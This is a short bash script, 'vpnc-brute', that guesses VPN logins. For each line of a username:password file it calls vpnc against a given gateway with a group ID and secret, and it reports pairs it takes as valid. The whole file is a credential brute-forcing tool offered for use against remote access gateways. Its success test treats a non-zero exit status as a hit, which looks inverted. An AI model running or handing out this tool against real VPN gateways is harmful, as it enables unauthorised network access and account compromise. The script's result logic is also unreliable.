#!/bin/bash

CAT=`which cat`
VPNC=`which vpnc`

function usage() {
echo "./vpnc-brute -h <gateway> -g <group-id> -s <secret> -f <file>"
	echo ""
	echo "-h: IP of the remote gateway"
	echo "-g: group id"
	echo "-s: group password"
	echo "-f: file of username:password"
	exit
}

while [ ! -z "$1" ]; do
	case $1 in
		-h) shift; gw="$1"; shift;;
		-g) shift; id="$1"; shift;;
		-s) shift; secret="$1"; shift;;
		-f) shift; hfile="$1"; shift;;
		* ) usage
		;;
		esac
	done

if [ ! -z $hfile ]; then
	list=`cat $hfile 2>/dev/null`
	if [ "$list" = "" ]; then
		echo "error: username:password file corrupted"
	fi
else
	usage
fi

if ([[ -z $gw ]] || [[ -z $id ]] || [[ -z $secret ]]) ; then 
	usage
fi

for listline in `cat $hfile 2>/dev/null`
do
	USERNAME=`echo $listline | cut -d ':' -f 1`
	PASSWORD=`echo $listline | cut -d ':' -f 2`

	$VPNC --gateway $gw --id $id --secret=$secret --username $USERNAME --password $PASSWORD --brute

	if [ $? -ne 0 ]; then
		echo "Found valid credentials $USERNAME:$PASSWORD"
	fi

	sleep 0.3

done
